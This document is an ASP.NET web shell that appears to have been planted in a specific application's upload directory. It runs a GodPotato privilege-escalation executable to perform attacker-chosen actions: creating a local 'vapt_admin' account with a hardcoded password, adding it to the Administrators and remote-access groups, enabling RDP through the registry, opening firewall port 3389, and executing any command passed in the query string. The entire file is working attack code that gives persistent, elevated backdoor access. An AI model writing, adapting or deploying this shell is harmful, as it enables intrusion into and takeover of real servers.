<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %>
<script runat="server">
string Run(string exe, string args){
    try{
        ProcessStartInfo psi = new ProcessStartInfo(exe, args);
        psi.RedirectStandardOutput=true; psi.RedirectStandardError=true;
        psi.UseShellExecute=false; psi.CreateNoWindow=true;
        Process p = Process.Start(psi);
        p.WaitForExit(30000);
        return p.StandardOutput.ReadToEnd()+p.StandardError.ReadToEnd();
    }catch(Exception ex){ return "ERR:"+ex.Message; }
}
protected void Page_Load(object sender, EventArgs e){
    string gpExe = @"E:\TS-iPASSFinal\UI\TSiPASS\Uploads\GodPotato_8789d413-eabc-4cc5-92a0-51da75a9362f.exe";
    string action = Request["a"] ?? "whoami";
    string cmdArgs;
    // Build args based on action
    if(action=="adduser"){
        cmdArgs = "-cmd \"cmd /c net user vapt_admin Pass1234 /add\"";
    } else if(action=="addadmin"){
        cmdArgs = "-cmd \"cmd /c net localgroup Administrators vapt_admin /add\"";
    } else if(action=="addrdp"){
        cmdArgs = "-cmd \"cmd /c net localgroup \\\"Remote Desktop Users\\\" vapt_admin /add\"";
    } else if(action=="addrm"){
        cmdArgs = "-cmd \"cmd /c net localgroup \\\"Remote Management Users\\\" vapt_admin /add\"";
    } else if(action=="verify"){
        cmdArgs = "-cmd \"cmd /c net user vapt_admin\"";
    } else if(action=="rdp_on"){
        cmdArgs = "-cmd \"cmd /c reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal^ Server /v fDenyTSConnections /t REG_DWORD /d 0 /f\"";
    } else if(action=="fw_rdp"){
        cmdArgs = "-cmd \"cmd /c netsh advfirewall firewall add rule name=RDP dir=in action=allow protocol=TCP localport=3389\"";
    } else {
        // Custom command via ?cmd=
        string customCmd = Request["cmd"] ?? "whoami";
        cmdArgs = "-cmd \"cmd /c " + customCmd + "\"";
    }
    string result = Run(gpExe, cmdArgs);
    Response.Write("<pre>" + System.Web.HttpUtility.HtmlEncode(result) + "</pre>");
}
</script>